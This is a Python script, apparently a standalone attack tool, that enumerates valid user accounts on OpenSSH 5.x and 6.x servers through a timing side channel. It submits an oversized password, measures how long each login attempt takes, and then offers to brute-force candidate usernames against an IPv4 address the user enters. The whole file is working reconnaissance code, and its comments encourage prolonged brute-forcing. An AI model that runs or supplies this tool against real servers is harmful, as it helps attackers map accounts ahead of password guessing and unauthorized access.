#! /usr/bin/env python
# coding=UTF-8

import time
import paramiko
import itertools

#Code to enumerate users for OpenSSH 5.X & 6.X

#Opens file that stores user names in order of frequency they around
def fetch_terms(userfile):
	l = []
	f = open(userfile);
	for line in f:
		line = line.rstrip('\n\r')
		l.append(line);
	f.close();
	return l

def post_write(userfile, existingusers, nonexistingusers):
	f = open(userfile, 'w');
	for user in existingusers:
		f.write(user+'\n');
	for name in nonexistingusers:
		f.write(name+'\n');
	f.close();

def sidechan(user,machine):
	exists = []
	token = 'Moustache'*2000
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	#time measurement
	timeStart = int(time.time())
	try:
		ssh.connect(machine, username=user, password=token)
	except paramiko.AuthenticationException,e:
		pass
	timeDone = int(time.time())
	#simple time calculation
	timeRes = timeDone-timeStart
	#Statement below useful for debugging
	#print "User "+user+" took %d" % timeRes
	if timeRes > 15:
		print "User %s exists." % user
		return True
	else:
		return False

machine = raw_input("Enter the IPv4 address to enumerate SSH users on: ")
exists = []
users = fetch_terms('Ranked-Users.txt');
for user in users:
	if sidechan(user,machine):
		exists.append(user)

#remove the users you found from the user list so you don't duplicate them in the output file
for i in exists:
	try:
		users.remove(i)
	except ValueError,e:
		pass
#write the new user list back out, because impatient users often ctrl-c during bruteforce
post_write('Ranked-Users.txt', exists, users)
print "We have exhausted our common username list. If you are willing to wait hours/days, try bruteforce."
ans = raw_input("Would you like to brute force other names (y/n)? ")
if ans == "y":
	print "This will take hours/days, be patient. You will be informed as soon as a user is found."
	#Dictionary List exhausted, let's bruteforce
	min_len = raw_input("Enter the min user name length (inclusive): ")
	max_len = raw_input("Enter the max user name length (inclusive): ")
	for i in range(int(min_len), int(max_len)+1, 1):
		x = itertools.combinations_with_replacement('etaoinshrdlcumwfgypbvkjxqz1234567890', i)
		for tup in x:
			name = ''
			for element in tup:
				name += element
			if sidechan(name,machine):
				exists.append(name)
				try:
					users.remove(name)
				except ValueError,e:
					pass
				#write the new user list back out
				post_write('Ranked-Users.txt', exists, users)
print "The following users were found:"
for found in exists:
	print found
print "It is possible some of these are false positives if timeouts or other delays occured during tests."
